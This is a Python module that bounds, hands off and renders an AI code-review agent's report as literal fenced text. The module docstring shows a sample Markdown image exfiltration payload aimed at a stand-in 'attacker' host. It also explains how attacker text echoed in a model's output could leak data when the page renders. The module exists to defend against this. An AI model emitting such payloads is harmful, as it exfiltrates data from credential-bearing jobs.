"""An agent's review report: its record, its handoff between jobs, and its summary.

Decision 0100: provider- and agent-neutral. An agent adapter translates whatever its
agent produced into an ``AgentReport``; everything after that -- bounding, the handoff
to the job that delivers it, and the summary a reader sees -- is the same for every
agent and every provider.

**The summary is literal text.** A summary is public and renders Markdown, including
images, so a report that echoes attacker-supplied text could carry
`![](https://attacker/?q=...)`, fetched when the page renders, with no click: an
exfiltration channel out of a credential-bearing job (Decision 0094 rule 22). So the
report is published as literal text inside one fenced block owned here. Nothing inside a
code fence is interpreted, so no image, link or scheme in the report can cause a fetch.

That shape replaced one that scanned for fences and escaped only the lines it believed
were outside them. It was wrong twice: a fence opened inside a list item is closed by
the next unindented line, because that line cannot continue the item lazily, and the
scanner passed an image through. The fence is instead chosen **longer than the longest
run of backticks anywhere in the report**, so no line in it can close the block -- one
invariant, checkable in one line, rather than a container-aware parser. The cost is
accepted: headings are not headings and references are not links.

**The handoff is untrusted.** The job that writes it ran the model, so the job that
reads it reads it through a directory descriptor, without following links, as bounded
regular files, and treats anything unexpected as an unavailable report. The status
record is written last, after the whole report: a cancelled job can still upload what
it wrote, and a report cut off mid-write must not travel beside `complete`.
"""

from __future__ import annotations

import errno
import os
import pathlib
import re
import stat
from typing import NamedTuple

STATUSES = frozenset({"complete", "incomplete", "unavailable"})
# What a summary shows of a report.
REPORT_BYTES = 65536
# What the delivering job receives. Three UTF-8 bytes can carry one UTF-16 unit, so a
# text cut here still holds more than a comment's 60,000-unit budget, and that comment's
# own truncation notice stays true. The reader accepts at most 256 KiB.
HANDOFF_BYTES = 192 * 1024
_HANDOFF_READ_BYTES = 256 * 1024
_MIN_FENCE = 3
_BACKTICK_RUN = re.compile(r"`+")


class AgentReport(NamedTuple):
    """What an agent produced, as every later step needs it.

    ``status`` is ``complete`` (the agent finished and said so), ``incomplete`` (it
    produced text but did not finish) or ``unavailable`` (there is no report, and
    ``reason`` says why). ``cut`` says the text was shortened before it got here.

    A NamedTuple rather than a dataclass: the repository's test harness imports scripts
    by path without registering them in `sys.modules`, and a dataclass with postponed
    annotations resolves its module through `sys.modules` at class creation.
    """

    status: str
    text: str
    cut: bool
    reason: str = ""


def unavailable(reason: str) -> AgentReport:
    """Return a report that says there is no report, and why."""
    return AgentReport("unavailable", "", False, reason)


def for_handoff(report: AgentReport) -> AgentReport:
    """Return ``report`` cut to what the handoff carries, the cut stated.

    Stated rather than inferred from length: sanitising can shrink a text below any
    length the reader would notice (a review finding on #353).
    """
    if report.status == "unavailable":
        return AgentReport("unavailable", "", False, report.reason)
    encoded = report.text.encode("utf-8")
    if len(encoded) <= HANDOFF_BYTES:
        return report
    text = encoded[:HANDOFF_BYTES].decode("utf-8", "ignore")
    return AgentReport(report.status, text, True, report.reason)


def write_handoff(report: AgentReport, directory: pathlib.Path) -> None:
    """Write ``report`` into ``directory``, created here, its status record last.

    Created exclusively and never through a link: a directory that already exists was
    not made by this step. The status is the commit record, so it is written after the
    whole report.
    """
    bounded = for_handoff(report)
    record = f"{bounded.status}\ntruncated\n" if bounded.cut else f"{bounded.status}\n"
    directory.mkdir(parents=True)
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW
    for name, content in (("report.txt", bounded.text), ("status", record)):
        descriptor = os.open(directory / name, flags, 0o644)
        with os.fdopen(descriptor, "w", encoding="utf-8") as stream:
            stream.write(content)


def _read_bounded(name: str, directory: int) -> str | None:
    """Return a regular file's text, bounded, or None for anything else."""
    try:
        descriptor = os.open(
            name,
            os.O_RDONLY | os.O_NOFOLLOW | getattr(os, "O_NONBLOCK", 0),
            dir_fd=directory,
        )
    except OSError as error:
        if error.errno in (errno.ENOENT, errno.ELOOP, errno.ENOTDIR):
            return None
        raise
    try:
        if not stat.S_ISREG(os.fstat(descriptor).st_mode):
            return None
        raw = os.read(descriptor, _HANDOFF_READ_BYTES + 1)
    finally:
        os.close(descriptor)
    if len(raw) > _HANDOFF_READ_BYTES:
        return None
    return raw.decode("utf-8", "replace")


def read_handoff(directory: pathlib.Path) -> AgentReport:
    """Return the handed-over report, or an unavailable one for anything odd.

    A missing directory is the normal case of a reviewing job that ended before it
    handed anything over, so it is a report that says so rather than an error.
    """
    missing = unavailable("The review finished, but its report is unavailable.")
    try:
        descriptor = os.open(
            directory, os.O_RDONLY | getattr(os, "O_DIRECTORY", 0) | os.O_NOFOLLOW
        )
    except OSError:
        return missing
    try:
        status = _read_bounded("status", descriptor)
        text = _read_bounded("report.txt", descriptor)
    finally:
        os.close(descriptor)
    # The status record: its first line, then `truncated` when the writer cut the
    # report. Anything else is not a record this module writes.
    lines = [] if status is None else status.split("\n")
    if (
        text is None
        or not lines
        or lines[0] not in STATUSES
        or [line for line in lines[1:] if line] not in ([], ["truncated"])
    ):
        return missing
    if lines[0] == "unavailable":
        return missing
    return AgentReport(lines[0], text, "truncated" in lines[1:])


def enclosing_fence(text: str) -> str:
    """Return a backtick fence no line of ``text`` can close.

    CommonMark closes a fenced block at a line whose first non-space run is the same
    character and **at least as long** as the opening one. A fence longer than the
    longest run of backticks anywhere in ``text`` therefore has no possible closing
    line, whatever containers -- lists, blockquotes -- the text puts around it.
    """
    longest = max((len(run) for run in _BACKTICK_RUN.findall(text)), default=0)
    return "`" * max(_MIN_FENCE, longest + 1)


def neutralise(text: str) -> str:
    """Return ``text`` as literal content of a fenced block nothing can escape."""
    fence = enclosing_fence(text)
    # `text` as the info string, so a renderer applies no syntax highlighting and, more
    # to the point, treats the content as data rather than as a language it knows.
    return f"{fence}text\n{text}\n{fence}"


def render_summary(report: AgentReport, *, reviewer: str) -> str:
    """Return the summary a reader sees for ``report``, from ``reviewer``."""
    if report.status == "unavailable":
        return f"## Review report unavailable\n\n{report.reason}\n"
    text = report.text
    # Truncated *before* the block is built, so the cut can never land inside the
    # closing fence and leave the rest of the summary inside an unterminated block.
    encoded = text.encode("utf-8")
    if len(encoded) > REPORT_BYTES:
        text = encoded[:REPORT_BYTES].decode("utf-8", "ignore")
        text += f"\n\n[report truncated at {REPORT_BYTES} bytes]"
    if report.status != "complete":
        # The text is still shown -- it is the only evidence of what the run did -- but
        # never under a heading that calls it the review. A diagnostic and a report are
        # both non-empty strings, so the heading is the only thing that distinguishes
        # them for the reader.
        return (
            "## Review incomplete\n\n"
            "The reviewer did not finish: its execution ended without a successful\n"
            "result. What follows is the last text it produced, which may be a\n"
            "diagnostic or partial narration rather than findings. Treat the change as\n"
            "not reviewed.\n\n"
            f"{neutralise(text)}\n"
        )
    return (
        f"## {reviewer} review report\n\n"
        "Published by the repository, not by the reviewer's own integration. The report\n"
        "is shown as literal text: a summary is public and renders Markdown, so an image\n"
        "in reviewer output would be fetched at render time.\n\n"
        f"{neutralise(text)}\n"
    )
